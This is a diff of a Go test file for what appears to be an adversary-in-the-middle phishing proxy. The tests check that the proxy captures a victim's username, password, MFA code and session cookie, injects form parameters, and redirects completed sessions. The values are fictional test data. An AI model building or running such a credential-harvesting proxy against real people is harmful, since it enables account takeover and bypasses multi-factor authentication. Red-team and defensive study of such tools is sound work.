@@ -41,33 +41,6 @@ func TestSessions_CredentialExtraction(t *testing.T) {
 	}
 }
 
-// TestSessions_NoCaptureOnNonLoginPath verifies that a POST to a non-login
-// path does not populate credentials on the session.
-func TestSessions_NoCaptureOnNonLoginPath(t *testing.T) {
-	harness := test.NewHarness(t)
-
-	harness.UpstreamMux.HandleFunc("/other", func(w http.ResponseWriter, r *http.Request) {
-		w.WriteHeader(http.StatusOK)
-	})
-
-	// Hit the lure path to establish a session first.
-	test.DrainAndClose(harness.VictimGet(t, "/"))
-	test.DrainAndClose(harness.VictimPost(t, "/other", "username=alice&password=s3cret"))
-
-	sessions, err := harness.API.ListSessions(sdk.SessionFilter{})
-	if err != nil {
-		t.Fatalf("ListSessions: %v", err)
-	}
-	if sessions.Total != 1 {
-		t.Fatalf("expected 1 session, got %d", sessions.Total)
-	}
-	sess := sessions.Items[0]
-	if sess.Username != "" || sess.Password != "" {
-		t.Errorf("expected no credentials on non-login path, got username=%q password=%q",
-			sess.Username, sess.Password)
-	}
-}
-
 // TestSessions_CookieTokenCapture verifies that an auth cookie set by the
 // upstream is captured into the session's cookie tokens.
 func TestSessions_CookieTokenCapture(t *testing.T) {
@@ -156,5 +129,136 @@ func TestSessions_RemainsOpenWithoutRequiredToken(t *testing.T) {
 	}
 	if sessions.Items[0].CompletedAt != nil {
 		t.Error("expected session to remain open, but CompletedAt is set")
+	}
+}
+
+// TestSessions_ForcePostInjectsParam verifies that force_post injects
+// the login_source=web parameter into login POSTs that contain an email field.
+func TestSessions_ForcePostInjectsParam(t *testing.T) {
+	harness := test.NewHarness(t)
+
+	var receivedLoginSource string
+	harness.UpstreamMux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
+		r.ParseForm()
+		receivedLoginSource = r.PostForm.Get("login_source")
+		w.WriteHeader(http.StatusOK)
+	})
+
+	// Establish session.
+	test.DrainAndClose(harness.VictimGet(t, "/"))
+
+	// POST with email field — force_post condition matches, should inject login_source.
+	test.DrainAndClose(harness.VictimPost(t, "/login", "email=alice%40example.com&password=s3cret"))
+
+	if receivedLoginSource != "web" {
+		t.Errorf("expected force_post to inject login_source=web, got %q", receivedLoginSource)
+	}
+}
+
+// TestSessions_CompletedSessionRedirects verifies that a request from a
+// completed session receives a 302 redirect to the lure's redirect URL
+// instead of being proxied upstream.
+func TestSessions_CompletedSessionRedirects(t *testing.T) {
+	harness := test.NewHarness(t)
+
+	harness.UpstreamMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		// Set the required token so session completes on first request.
+		http.SetCookie(w, &http.Cookie{
+			Name:   "session",
+			Value:  "tok-abc",
+			Domain: ".testsite.internal",
+		})
+		fmt.Fprint(w, "ok")
+	})
+
+	// First request: session created + completed (required token captured).
+	test.DrainAndClose(harness.VictimGet(t, "/"))
+
+	// Second request: session is done, should get 302 to lure redirect URL.
+	resp := harness.VictimGet(t, "/anything")
+	defer test.DrainAndClose(resp)
+
+	if resp.StatusCode != http.StatusFound {
+		t.Fatalf("expected 302 for completed session, got %d", resp.StatusCode)
+	}
+	loc := resp.Header.Get("Location")
+	if loc != "https://testsite.internal/" {
+		t.Errorf("Location = %q, want %q", loc, "https://testsite.internal/")
+	}
+}
+
+// TestSessions_FullLoginFlow simulates the complete form login:
+// lure hit → login POST → MFA POST → session complete with credentials.
+func TestSessions_FullLoginFlow(t *testing.T) {
+	harness := test.NewHarness(t)
+
+	harness.UpstreamMux.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
+		if r.Method == http.MethodPost {
+			http.SetCookie(w, &http.Cookie{Name: "pending", Value: "tok"})
+			http.Redirect(w, r, "/mfa", http.StatusFound)
+			return
+		}
+		fmt.Fprint(w, "login page")
+	})
+	harness.UpstreamMux.HandleFunc("/mfa", func(w http.ResponseWriter, r *http.Request) {
+		if r.Method == http.MethodPost {
+			// Set the required auth cookie — this triggers session completion.
+			http.SetCookie(w, &http.Cookie{
+				Name:   "session",
+				Value:  "auth-tok-xyz",
+				Domain: ".testsite.internal",
+			})
+			http.Redirect(w, r, "/dashboard", http.StatusFound)
+			return
+		}
+		fmt.Fprint(w, "mfa page")
+	})
+	harness.UpstreamMux.HandleFunc("/dashboard", func(w http.ResponseWriter, r *http.Request) {
+		fmt.Fprint(w, "dashboard")
+	})
+
+	// 1. Hit lure → session created.
+	test.DrainAndClose(harness.VictimGet(t, "/"))
+
+	// 2. POST login credentials.
+	resp := harness.VictimPost(t, "/login", "email=alice%40example.com&password=s3cret")
+	test.DrainAndClose(resp)
+
+	// 3. Follow redirect to /mfa, then POST MFA code.
+	test.DrainAndClose(harness.VictimGet(t, "/mfa"))
+	resp = harness.VictimPost(t, "/mfa", "code=123456")
+	test.DrainAndClose(resp)
+
+	// 4. Verify session state.
+	sessions, err := harness.API.ListSessions(sdk.SessionFilter{})
+	if err != nil {
+		t.Fatalf("ListSessions: %v", err)
+	}
+	if sessions.Total != 1 {
+		t.Fatalf("expected 1 session, got %d", sessions.Total)
+	}
+	sess := sessions.Items[0]
+	if sess.Username != "alice@example.com" {
+		t.Errorf("Username = %q, want %q", sess.Username, "alice@example.com")
+	}
+	if sess.Password != "s3cret" {
+		t.Errorf("Password = %q, want %q", sess.Password, "s3cret")
+	}
+	if sess.Custom == nil || sess.Custom["mfa_code"] != "123456" {
+		t.Errorf("Custom[mfa_code] = %q, want %q", sess.Custom["mfa_code"], "123456")
+	}
+	if sess.CompletedAt == nil {
+		t.Error("expected session to be complete")
+	}
+	// Verify auth cookie was captured.
+	found := false
+	for _, byName := range sess.CookieTokens {
+		if _, ok := byName["session"]; ok {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Error("expected session cookie token to be captured")
 	}
 }
